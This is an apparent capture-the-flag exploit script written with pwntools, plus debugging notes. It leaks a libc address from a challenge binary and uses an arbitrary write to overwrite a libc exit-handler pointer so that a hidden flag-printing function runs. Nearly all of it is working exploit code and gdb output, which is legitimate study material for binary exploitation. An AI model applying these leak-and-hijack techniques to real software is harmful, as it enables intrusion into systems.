from pwn import *

local_bin = "./environment_original"
elf = ELF(local_bin)
rop = ROP(elf)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")


#p = gdb.debug(local_bin, '''
	#break *0x401477
	#break recycle
	#break *__run_exit_handlers+474
	#continue
	#''')

p = process(local_bin)

OFFSET_CAT_FLAG = elf.symbols['hidden_resources']
print("OFFSET_CAT_FLAG = ", hex(OFFSET_CAT_FLAG))

OFFSET_EXIT_GOT = elf.got['exit']
print("EXIT_GOT = ", hex(OFFSET_EXIT_GOT))

OFFSET_EXIT_HANDLER = 0x7ffff7fb0608 - 0x7ffff7df0000

def addPlant(location,value):
	p.sendline(b'1')
	p.recvuntil(b'>')
	#What do you want to plant?
	p.sendline(location)
	p.recvuntil(b'>')
	p.sendline(value)

def recycle(item):
	p.sendline(b'2')
	p.recvuntil(b'>')
	p.sendline(item)
	p.recvuntil(b'>')
	p.sendline(b'n')

p.recvuntil(b'>')
recycle(b'1')

p.recvuntil(b'>')
recycle(b'1')

p.recvuntil(b'>')
recycle(b'1')

p.recvuntil(b'>')
recycle(b'1')

p.recvuntil(b'>')
recycle(b'1')

leak_printf = p.recvuntil(b'gift: \x1b[0m[')
leak_printf = p.recvuntil(b']')
leak_printf = leak_printf[:-1]
leak_printf = int(leak_printf, 16)
print("printf@got = ",leak_printf)

libc_base = leak_printf - libc.sym["printf"]
print("libc base = ",hex(libc_base))

EXIT_HANDLER = libc_base + OFFSET_EXIT_HANDLER
print("EXIT_HANDLER = ",hex(EXIT_HANDLER))

p.recvuntil(b'>')
location = str(EXIT_HANDLER)
value = str(OFFSET_CAT_FLAG)
addPlant(location,value)

p.interactive()

'''
0x4014f0 <recycle+85>     mov    eax, 0
0x4014f5 <recycle+90>     call   __isoc99_scanf@plt <__isoc99_scanf@plt>

scanf %d no overflow here
###########################

0x40126f <form+63>    mov    rsi, rax
0x401272 <form+66>    mov    edi, 0
0x401277 <form+71>    call   read@plt <read@plt>

read in 3 bytes
###########################
after first recycle:
rsp = 0x7fffffffe4d8
scanf 0x7fffffffe4c4
rsp = 0x7fffffffe4d8
read =0x7fffffffe48c

###########################
After recycle 10 times:
read 10 bytes into 0x7fffffffe490
I can leak any address i want

Send recycle then say its the first time
Count will not be incremented

###########################
Plant:
Write to any address I want

0x401477 <plant+244>    mov    qword ptr [rax], rdx
0x40147a <plant+247>    mov    dword ptr [rip + 0x201bfc], 0x16 <0x603080>

This will auto exit

REL COUNT:
0x603080
###########################
Overwriting exit handler 0x7ffff7faf608 to print_flag function

0x7ffff7e2d55a <__run_exit_handlers+474>    lea    rbx, [rip + 0x1820a7] <0x7ffff7faf608>
0x7ffff7e2d561 <__run_exit_handlers+481>    lea    r12, [rip + 0x1820a8]
0x7ffff7e2d568 <__run_exit_handlers+488>    cmp    rbx, r12
0x7ffff7e2d56b <__run_exit_handlers+491>    jae    __run_exit_handlers+507 <__run_exit_handlers+507>
 
0x7ffff7e2d56d <__run_exit_handlers+493>    nop    dword ptr [rax]
0x7ffff7e2d570 <__run_exit_handlers+496>    call   qword ptr [rbx]

This address can be overwritten 0x7ffff7faf608 

0x7ffff7def000     0x7ffff7e14000 r--p    25000 0      /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x7ffff7e14000     0x7ffff7f5f000 r-xp   14b000 25000  /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x7ffff7f5f000     0x7ffff7fa9000 r--p    4a000 170000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x7ffff7fa9000     0x7ffff7faa000 ---p     1000 1ba000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x7ffff7faa000     0x7ffff7fad000 r--p     3000 1ba000 /usr/lib/x86_64-linux-gnu/libc-2.31.so
0x7ffff7fad000     0x7ffff7fb0000 rw-p     3000 1bd000 /usr/lib/x86_64-linux-gnu/libc-2.31.so


'''